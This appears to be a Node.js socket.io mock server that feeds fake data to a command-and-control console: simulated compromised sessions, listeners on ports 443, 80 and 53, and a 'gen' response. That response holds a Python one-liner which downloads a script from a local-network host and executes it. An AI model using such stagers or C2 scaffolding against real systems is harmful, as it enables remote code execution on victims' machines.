import { createServer } from 'http';
import { Server } from 'socket.io';

const httpServer = createServer();
const io = new Server(httpServer, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

// 模拟数据
const mockSessions = [
  {
    id: '1',
    user: 'Administrator',
    hostname: 'WIN-2022',
    platform: 'windows',
    release: '10',
    os_arch: '64',
    proc_arch: 'x64',
    intgty_lvl: 'high',
    address: '192.168.1.100',
    tags: ['windows', 'admin'],
    connected_at: '2026-03-30 10:00:00',
  },
  {
    id: '2',
    user: 'user',
    hostname: 'ubuntu-server',
    platform: 'linux',
    release: '22.04',
    os_arch: '64',
    proc_arch: 'x64',
    intgty_lvl: 'medium',
    address: '192.168.1.101',
    tags: ['linux', 'server'],
    connected_at: '2026-03-30 10:05:00',
  },
  {
    id: '3',
    user: 'john',
    hostname: 'macbook-pro',
    platform: 'darwin',
    release: '14.0',
    os_arch: '64',
    proc_arch: 'arm64',
    intgty_lvl: 'medium',
    address: '192.168.1.102',
    tags: ['macos', 'developer'],
    connected_at: '2026-03-30 10:10:00',
  },
];

const mockListeners = [
  {
    id: '1',
    name: 'tcp443',
    transport: 'tcp',
    address: '0.0.0.0',
    port: '443',
    status: 'active',
    info: 'TCP listener on port 443',
  },
  {
    id: '2',
    name: 'http80',
    transport: 'http',
    address: '0.0.0.0',
    port: '80',
    status: 'active',
    info: 'HTTP listener on port 80',
  },
  {
    id: '3',
    name: 'dns53',
    transport: 'dns',
    address: '0.0.0.0',
    port: '53',
    status: 'inactive',
    info: 'DNS listener on port 53',
  },
];

io.on('connection', (socket) => {
  console.log('Client connected');

  socket.on('command', (data) => {
    console.log('Received command:', data);

    let result = null;

    switch (data.command) {
      case 'sessions':
        result = mockSessions;
        break;
      case 'listen':
        if (data.args && data.args.includes('--list')) {
          result = mockListeners;
        }
        break;
      case 'gen':
        result = {
          success: true,
          message: 'Payload generated successfully',
          payload: {
            name: 'test-payload',
            path: '/path/to/payload',
            oneliner: 'python3 -c "import urllib.request;exec(urllib.request.urlopen(\"http://192.168.1.1:80/payload.py\").read())"'
          }
        };
        break;
      default:
        result = { error: 'Command not supported' };
    }

    socket.emit(`command:${data.id}`, { id: data.id, result });
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected');
  });
});

httpServer.listen(8000, () => {
  console.log('WebSocket server running on port 8000');
});